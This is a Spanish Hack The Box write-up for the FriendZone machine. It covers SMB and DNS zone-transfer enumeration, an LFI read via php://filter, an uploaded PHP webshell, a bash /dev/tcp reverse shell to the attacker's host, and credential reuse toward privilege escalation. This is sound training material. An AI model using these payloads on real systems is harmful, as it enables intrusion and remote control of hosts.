---
title: FriendZone WriteUp
date: 2024-03-21
categories: [WriteUps, Máquinas Linux]
tags: [SMB, AXFR, LFI, Python Library Hijacking]
image:
  path: ../../assets/img/writeups/FriendZone/friendzone.jpg
  width: 528
  height: 340
  alt: Banner FriendZone
---

¡Hola gente!, caja muy chula, practicamos enumeración SMB, DNS y web, un ataque LFI para la explotación y un Python Library Hijacking para la escalada. Aprendemos cosillas.

## Enumeración

¡Hooola!, estamos hoy ante la máquina **FriendZone** con IP **10.10.10.123**. Después de conectarnos a la VPN de Hack The Box (HTB) y spawnear -encenderla digamos- la máquina en la plataforma de HTB, comprobemos que tenemos conectividad con la máquina:

```sh
❯ ping -c 1 10.10.10.123
PING 10.10.10.123 (10.10.10.123) 56(84) bytes of data.
64 bytes from 10.10.10.123: icmp_seq=1 ttl=63 time=40.2 ms

--- 10.10.10.123 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 40.207/40.207/40.207/0.000 ms
```

Llegamos a ella; un paquete envíado, un paquete recibido. Además podemos ver que el **ttl** es 63, **cercano a 64**, con lo que estaremos ante una máquina **Linux**.

Vayamos con la enumeración de puertos.

```sh
❯ nmap 10.10.10.123 -p- --open --min-rate 5000 -n -Pn -vvv -oN ports
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-21 16:28 CET
Initiating SYN Stealth Scan at 16:28
Scanning 10.10.10.123 [65535 ports]
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 80/tcp on 10.10.10.123
Discovered open port 21/tcp on 10.10.10.123
Discovered open port 139/tcp on 10.10.10.123
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123
Discovered open port 22/tcp on 10.10.10.123
Completed SYN Stealth Scan at 16:28, 11.17s elapsed (65535 total ports)
Nmap scan report for 10.10.10.123
Host is up, received user-set (0.040s latency).
Scanned at 2024-03-21 16:28:20 CET for 11s
Not shown: 65528 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
53/tcp  open  domain       syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
443/tcp open  https        syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds
```

Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.123 : Dirección IP objetivo, la cual quiero escanear
* -oN ports : Exportará el output a un fichero tipo nmap que llamaremos "ports"

Tenemos unos cuantos puertos abiertos, a estos puertos les haremos otro escaner más profundo, averiguando sus versiones (**-sV**) y más información con una serie de scripts por defecto (**-sC**).

```sh
❯ nmap 10.10.10.123 -p21,22,53,80,139,443,445 -sC -sV -oN servicesPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-21 16:34 CET
Nmap scan report for 10.10.10.123
Host is up (0.040s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)
|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
| smb2-time: 
|   date: 2024-03-21T15:35:06
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2024-03-21T17:35:06+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.91 seconds
```

Teniendo las versiones uso la herramienta searchsploit para comprobar si esas versiones tienen alguna vulnerabilidad, por ejemplo `searchsploit vsftpd 3.0.3`. Algunas las tienen pero me parecen poco útiles y prefiero continuar de otras maneras.

### Enumeración Web

Empecemos por el servicio **web** en el puerto **80** y en el **443**, usaré la herramienta **whatweb** para reconocer algo más de información sobre ellas, como las tecnologías que corren por detrás.

```sh
❯ whatweb http://10.10.10.123
http://10.10.10.123 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]
❯ whatweb https://10.10.10.123
https://10.10.10.123 [404 Not Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[404 Not Found]
```

Parece que el https (443) no lo encuentra, si nos fijamos bien en el primero tenemos un dominio **friendzoneportal.red**, añadimos la siguiente línea al **/etc/hosts**. También encontramos **friendzone.red** en el segundo escaner de nmap, lo añadimos:

```plaintext
10.10.10.123        friendzoneportal.red  friendzone.red
``` 

Y ahora si:

```sh
❯ whatweb http://friendzone.red
http://friendzone.red [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]

# Y lo que es lo mismo que lo anterior:
❯ whatweb https://friendzoneportal.red
https://friendzoneportal.red [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Watching you !]

# También funciona para http:
❯ whatweb http://friendzoneportal.red
http://friendzoneportal.red [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]
```

Voy a realizar un ligero fuzzing de subdirectorios antes de visualizar las páginas en el navegador usando nmap.

```sh
❯ nmap 10.10.10.123 -p80 --script http-enum -oN enum80
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-21 16:54 CET
Nmap scan report for friendzoneportal.red (10.10.10.123)
Host is up (0.040s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|_  /robots.txt: Robots file

Nmap done: 1 IP address (1 host up) scanned in 3.93 seconds

❯ nmap 10.10.10.123 -p443 --script http-enum -oN enum443
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-21 16:54 CET
Nmap scan report for friendzoneportal.red (10.10.10.123)
Host is up (0.039s latency).

PORT    STATE SERVICE
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
```

Para la web del puerto 80 encontramos un subdirectorio y un archivo; **/wordpress/** y **/robots.txt**. Para la web de https ninguno.

Ahora si, vayamos al navegador para visualizar las páginas. Esta es la del puerto 80 -he reducido la imagen, faltarían unas manos, no es importante-:

![Web80]({{ 'assets/img/writeups/FriendZone/web80.png' | relative_url }}){: .center-image }

En la página fuente no hay nada de valor.

Tanto en el puerto 80 como en el puerto 443 podemos llegar con **friendzone.red** como **friendzoneportal.red**, sale un video corto (gif) de Michael Jackson comiendo palomitas, el título de la web es **Whatching you!**. En la página fuente poca cosa:

```html
<title>Watching you !</title>

<h2>G00d !</h2>

<img src="z.gif">
```

Encontramos dos recursos más por debajo de la primera web (/wordpress y /robots.txt). En **http://10.10.10.123/robots.txt** encontramos un **seriously?**, vamos.. que no hay nada. Y en **/wordpress** hay directory listing pero está vacío.

Antes de terminal la enumeración web voy a fuzzear con la herramienta **gobuster** y un diccionario pequeño. Añadiré a la búsqueda las extensiones txt y php.

```sh
❯ gobuster dir -u http://friendzoneportal.red/ --wordlist /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x txt,php -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://friendzoneportal.red/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2024/03/21 17:52:41 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 332] [--> http://friendzoneportal.red/wordpress/]
/robots.txt           (Status: 200) [Size: 13]                                              
Progress: 53016 / 262995 (20.16%)                                                          ^Z
zsh: suspended  gobuster dir -u http://friendzoneportal.red/ --wordlist  -x txt,php -t 20
❯ kill %
[1]  + terminated  gobuster dir -u http://friendzoneportal.red/ --wordlist  -x txt,php -t 20
```
Llevaba solo dos minutos pero lo paré. Mejor esperar a que acabe o poner mas hilos **-t**, aunque cuanto más rápido más posible que se pase alguno. Esos recursos ya los teniamos.

Hagamos el mismo fuzzing para la web https:

```sh
❯ gobuster dir -k -u https://friendzone.red/ --wordlist /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x txt,php -t 40

# No encontró nada.
```

### Enumeración SMB

El servicio SMB por TCP lo tenemos en los puertos **139** y **445**.

Quiero ver los recursos compartidos para ello usaré **smbclient**:

```sh
❯ smbclient -N -L //10.10.10.123

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Files           Disk      FriendZone Samba Server Files /etc/Files
	general         Disk      FriendZone Samba Server Files
	Development     Disk      FriendZone Samba Server Files
	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            FRIENDZONE
```

La opción **-N** es de Null Session ( sin credenciales) y **-L** de listar los recursos.

También podemos usar la herramienta **smbmap**, incluso mejor porque podemos ver los permisos que tenemos en cada carpeta:

```sh
❯ smbmap -H 10.10.10.123
[+] Guest session   	IP: 10.10.10.123:445	Name: friendzoneportal.red                              
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	Files                                             	NO ACCESS	FriendZone Samba Server Files /etc/Files
	general                                           	READ ONLY	FriendZone Samba Server Files
	Development                                       	READ, WRITE	FriendZone Samba Server Files
	IPC$                                              	NO ACCESS	IPC Service (FriendZone server (Samba, Ubuntu))

```

Una observación; Puede que la carpeta Files esté en la ruta /etc/Files en local por lo que veo arriba. Quizás el resto también se encuetren en /etc/.  
Veamos que encontramos en las carpetas que tenemos acceso:

```sh
❯ smbclient -N //10.10.10.123/Development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 21 17:32:52 2024
  ..                                  D        0  Tue Sep 13 16:56:24 2022

		3545824 blocks of size 1024. 1634164 blocks available
smb: \> 
```

Development está vacía.

```sh
❯ smbclient -N //10.10.10.123/general
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 21:10:51 2019
  ..                                  D        0  Tue Sep 13 16:56:24 2022
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

		3545824 blocks of size 1024. 1634164 blocks available

smb: \> get creds.txt 
getting file \creds.txt of size 57 as creds.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
smb: \> exit
``` 

En **general** si que encontramos un archivo interesante. Lo descargamos y echamos un vistazo:

```sh
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Guardaré estas credenciales. Pruebo a conectarme por ssh con esas credenciales pero nada:

```sh
❯ ssh admin@10.10.10.123
The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.123' (ECDSA) to the list of known hosts.
admin@10.10.10.123's password:    # Aquí puse la contraseña encontrada
Permission denied, please try again.
```

### Enumeración DNS

Realizamos un ataque de transferencia de zona al dominio **friendszone.red**:

```sh
❯ dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.18.16-1~deb12u1~bpo11+1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 43 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Thu Mar 21 18:20:52 CET 2024
;; XFR size: 8 records (messages 1, bytes 289)
```

Probemos también a hacer lo mismo con el otro subdominio **friendzoneportal.red**:

```sh
❯ dig axfr friendzoneportal.red @10.10.10.123

; <<>> DiG 9.18.16-1~deb12u1~bpo11+1-Debian <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.	604800	IN	AAAA	::1
friendzoneportal.red.	604800	IN	NS	localhost.
friendzoneportal.red.	604800	IN	A	127.0.0.1
admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
files.friendzoneportal.red. 604800 IN	A	127.0.0.1
imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Thu Mar 21 18:25:08 CET 2024
;; XFR size: 9 records (messages 1, bytes 309)
```

Ahora tendremos que añadir todos esos subdominios al **/etc/host**.

```sh
❯ cat /etc/hosts | grep friendzone
10.10.10.123        friendzoneportal.red  friendzone.red  administrator1.friendzone.red  hr.friendzone.red  uploads.friendzone.red  admin.friendzoneportal.red  files.friendzoneportal.red  imports.friendzoneportal.red  vpn.friendzoneportal.red
```

Echemos un vistazo a cada uno. Voy a poner en formato tabla lo obtenido, por **http** en todas ellas nos saca lo mismo que en friendzone.red pero por **https** cambia la cosa:

| Dominio | Por HTTPS |
| --- | --- |
| administrator1.friendzone.red |  Panel de login |
| hr.friendzone.red |  Not Found |
| uploads.friendzone.red | Página uploads |
| admin.friendzoneportal.red |  Panel de login |
| files.friendzoneportal.red |  Not Found |
| imports.friendzoneportal.red | Not Found |
| vpn.friendzoneportal.red | Not Found |

Así que nos quedan dos dominios interesantes; **administrator1.friendzone.red**, **uploads.friendzone.red** y **admin.friendzoneportal.red**.

Empecemos por el tercero, admin.friendzoneportal.red, cualquier usuario que metamos incluido las credenciales que encontramos nos responde con el mensaje "Admin page is not developed yet !!! check for another one". Vamos a descartar por lo tanto este dominio de momento y pasemos al otro.

## Local File Inclusion

En **administrator1.friendzone.red** si nos logeamos en el panel de inicio con las credenciales encontradas **admin:WORKWORKHhallelujah@#** parece que nos logeamos pero recibimos solo este mensaje; **Login Done ! visit /dashboard.php**. Hacemos caso y vamos a **https://administrator1.friendzone.red/dashboard.php**. Esto nos encontramos:

![Dashboard]({{ 'assets/img/writeups/FriendZone/dashboard.png' | relative_url }}){: .center-image }

Nos comentan que hay varios parámetros que podemos usar; image_name, image_id y pagename . Si escribimos lo mismo que el ejemplo; **https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg**, nos sale una imagen de Nelson -personaje de The Simpson- y el mensaje "Something went worng ! , the script include wrong param !".  

Esto de los parámetros huele a LFI (Local File Inclusion). Probemos en cada parámetro algunas cosillas como:

```plaintext
=/etc/passwd

=../../../../../../etc/passwd

=file:///etc/passwd 
# wrapper file

=php://filter/convert.base64-encode/resource=<archivo.php> # ó el /etc/passwd también.
# Y este es el wrapper in base64 para poder ver el código en php en base64

=....//....//....//....//....//....//etc/passwd 
# por si sanitiza y borra el ../
```
Hay una combinación que parece funcionar, en la URL:

```plaintext
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard
```

Nos saca una cadena en base64, que si decodeamos en local:

```sh
❯ echo "PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI
... SNIP .....
+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=" |base64 -d > dashboard.php
```
Al abrir el dashboard.php nos encontramos su código:

```php
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```

Parece -era de suponer- que incluye .php en el valor del parámetro pagename, quizás se pueda anular con un byte null (**%00**) para buscar otro tipo de archivos. Pruebo con lo siguiente pero nada:

```plaintext
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=/etc/passwd%00

https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../../../../../../../../../etc/passwd%00
```
Veamos que otros archivos php podemos conseguir. En la página fuente del dominio **https://uploads.friendzone.red/** vimos este recurso **upload.php**, que parece subir imagenes. Es recomendable apuntarse todos estos archivos de la máquina en algún fichero. Probemos el LFI para upload.php.

```plaintext
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=upload
# Nada, no funciona

https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../upload
# Tampoco

# Pero si pruebo por ../uploads/upload si funciona. Por el dominio que era podría probarse.
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../uploads/upload
```

Y decodeamos para ver que es:

```sh
❯ echo "PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K" | base64 -d > upload.php
❯ cat upload.php
```

```php
<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>
```

Se puede ver que es una página de carga de archivos falsa. No parece guardar la imagen en ningún lugar.

Atemos cabos con todo lo que tenemos, un LFI podemos llamar a recursos locales de la máquina, que sean php. Y si recuerdas, por SMB vimos que en la carpeta **Development**, que podría estar en la ruta **/etc/Development** ya que vimos en el mismo SMB la ruta **/etc/Files** tenemos permisos de escritura. Así que podríamos cargar una webshell y luego llamarla desde el LFI.

## Subida de WebShell y shell como www-data

Subamos una webshell.php. Primero creo ese php:

```php
<?php system($_REQUEST['cmd']); ?>
```

Y ahora hay dos maneras de subirlo:

```sh
# Desde fuera del smb
❯ smbclient -N //10.10.10.123/Development -c 'put webshell.php'
putting file webshell.php as \webshell.php (0,3 kb/s) (average 0,3 kb/s)
❯ smbclient -N //10.10.10.123/Development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 22 10:23:58 2024
  ..                                  D        0  Tue Sep 13 16:56:24 2022
  webshell.php                        A       34  Fri Mar 22 10:23:58 2024

		3545824 blocks of size 1024. 1572992 blocks available
# vemos arriba como funciona

# O desde dentro:
smb: \> put webshell.php
```

Una vez que está ya alojada en la máquina objetivo es hora de llamarlo desde nuestro LFI. Pero ¡espera!, desde nuestro LFI con el wrapper de base 64 no funcionará, ya que de esta manera no interpreta el código en php. Tenemos que probar a llamar al recurso directamente. En vez de probar con la webshell.php que no tenemos muy claro donde esta probemos con **dashboard** que sabemos que está en la carpeta actual. Doy con la url que llama al php a la primera ueue; **https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=dashboard**. Vemos en el navegador que nos sale Nelson dos veces. Ahora probemos a llamar a la whebshell.php, haciendo path traversal y suponiendo la dirección /etc/Development; **https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../../../etc/Development/webshell&cmd=id**. Funciona:

![RCE]({{ 'assets/img/writeups/FriendZone/rce.png' | relative_url }}){: .center-image }

¡Guay!. Tenemos RCE (Remote Command Execution). 

Quiero lanzarme una reverse shell. En vez de usar el comando `id` usaré este `bash -c 'bash -i >& /dev/tcp/10.10.14.23/443 0>&1'`, pero sustituyendo el ampersand por **%26** -a hexadecimal-, así suele funcionar mejor.

Me pongo en escucha por el puerto 443.

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
```
Y ahora en la url; **https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../../../etc/Development/webshell&cmd=bash -c 'bash -i >&26 /dev/tcp/10.10.14.23/443 0>&261'**.

Se queda cargando el navegador y si volvemos a nuestra consola en escucha recibimos la reverse shell:

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.123] 41364
bash: cannot set terminal process group (737): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/var/www/admin$ whoami
whoami
www-data
www-data@FriendZone:/var/www/admin$
```
Para tener una consola full interactiva haremos el tratamiento habitual:

```sh
www-data@FriendZone:/var/www/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@FriendZone:/var/www/admin$ ^Z
zsh: suspended  nc -nlvp 443
```
Nos vuelve a máquina local:

```sh
stty raw -echo; fg
reset xterm
```

Nos vuelve a máquina remota y por último para el tratamiento de la tty:

```sh
www-data@FriendZone:/var/www/admin$ export TERM=xterm
www-data@FriendZone:/var/www/admin$ export SHELL=bash
www-data@FriendZone:/var/www/admin$ stty rows 38 columns 184
```

Vayamos a por la primera flag:

```sh
www-data@FriendZone:/var/www/admin$ cd /home
www-data@FriendZone:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Sep 13  2022 .
drwxr-xr-x 22 root   root   4096 Sep 13  2022 ..
drwxr-xr-x  5 friend friend 4096 Sep 13  2022 friend
www-data@FriendZone:/home$ cd friend
www-data@FriendZone:/home/friend$ ls -la
total 36
drwxr-xr-x 5 friend friend 4096 Sep 13  2022 .
drwxr-xr-x 3 root   root   4096 Sep 13  2022 ..
lrwxrwxrwx 1 root   root      9 Jan 24  2019 .bash_history -> /dev/null
-rw-r--r-- 1 friend friend  220 Oct  5  2018 .bash_logout
-rw-r--r-- 1 friend friend 3771 Oct  5  2018 .bashrc
drwx------ 2 friend friend 4096 Sep 13  2022 .cache
drwx------ 3 friend friend 4096 Sep 13  2022 .gnupg
drwxrwxr-x 3 friend friend 4096 Sep 13  2022 .local
-rw-r--r-- 1 friend friend  807 Oct  5  2018 .profile
-r--r--r-- 1 root   root     33 Mar 21 15:39 user.txt
www-data@FriendZone:/home/friend$ cat user.txt
6da03d37d182303be4ed8b********
```

## Escalada

Estamos como el usuario **www-data**, tendremos que escalar hasta root.

```sh
www-data@FriendZone:/home/friend$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@FriendZone:/home/friend$ sudo -l
[sudo] password for www-data:   # No me sé ninguna contraseña

www-data@FriendZone:/home/friend$ find / \-perm -4000 2>/dev/null
/bin/fusermount
/bin/umount
/bin/mount
/bin/su
/bin/ntfs-3g
/bin/ping
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/sbin/exim4
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
# No hay ninguno creo que se pueda usar para la escalada.

www-data@FriendZone:/home/friend$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep

www-data@FriendZone:/home/friend$ lsb_release -a  # Distribución Linux más o menos reciente.
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.1 LTS
Release:	18.04
Codename:	bionic

www-data@FriendZone:/home/friend$ uname -a    # Para buscar nombre y versión de kernel, la versión no es muy antigua.
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Echaremos un vistazo a los archivos del sistema.

```sh
www-data@FriendZone:/var/www$ ls
admin  friendzone  friendzoneportal  friendzoneportaladmin  html  mysql_data.conf  uploads
www-data@FriendZone:/var/www$ wc -l mysql_data.conf 
7 mysql_data.conf
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

Uououo parece que encontramos la password del usuario friend.

### De www-data a friend

```sh
www-data@FriendZone:/var/www$ su friend
Password: 
friend@FriendZone:/var/www$ whoami
friend
friend@FriendZone:/var/www$ id
uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)

# Gracias al grupo adm quizás podríamos ver los logs. Pero raro sería ver la password de root por ahí.
```
También podríamos conectarnos por ssh con esas credenciales.

Sigamos con el reconocimiento del sistema objetivo.  
Parece que en **/opt** encontramos un directorio comúm y dentro un ejecutable en python:

```sh
friend@FriendZone:/var/www$ cd /opt
friend@FriendZone:/opt$ ls
server_admin
friend@FriendZone:/opt$ ls -l
total 4
drwxr-xr-x 2 root root 4096 Sep 13  2022 server_admin
friend@FriendZone:/opt$ cd server_admin/
friend@FriendZone:/opt/server_admin$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Sep 13  2022 .
drwxr-xr-x 3 root root 4096 Sep 13  2022 ..
-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
```

Solo tendremos permiso de leerlo,y esto hay dentro:

```py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

